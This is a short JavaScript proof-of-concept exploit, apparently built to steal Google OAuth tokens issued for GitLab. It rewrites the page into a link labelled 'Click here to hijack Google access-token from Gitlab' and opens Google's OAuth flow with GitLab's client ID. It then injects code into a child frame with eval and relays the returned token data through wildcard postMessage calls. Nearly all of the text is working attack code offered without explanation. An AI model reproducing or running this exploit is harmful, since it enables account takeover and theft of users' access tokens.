var b, x;  
var state = location.href.substr(location.href.indexOf('state='));  
document.body.innerHTML = '<a href="#" onclick="b=window.open(\'https://accounts.google.com/o/oauth2/auth/oauthchooseaccount?client_id=944345355247-8avg15h7m1360efs32tuqq8jak1qr42n.apps.googleusercontent.com&redirect_uri=https%3A%2F%2Fgitlab.com%2Fusers%2Fauth%2Fgoogle_oauth2%2Fcallback&response_type=code%2cid_token&scope=email%20profile&state=' + state + '&flowName=GeneralOAuthFlow\');">Click here to hijack Google access-token from Gitlab</a>';  
top.postMessage('stopinject', '*');  
window.onmessage=function(e) { top.postMessage(e.data, '*'); b.close(); }  
x = setInterval(function() {

if(b && b.frames[1]) {  
  b.frames[1].eval(  
    'onmessage=function(e) { top.opener.postMessage(e.data, "*") };' +  
    'top.postMessage(\'{"key":"12D76D4C-5EDF-4EB4-A84D-042C497A9610","message":"request config","type":"broadcast"}\',"*")'  
  )  
  clearInterval(x)  
}

}, 1000);  
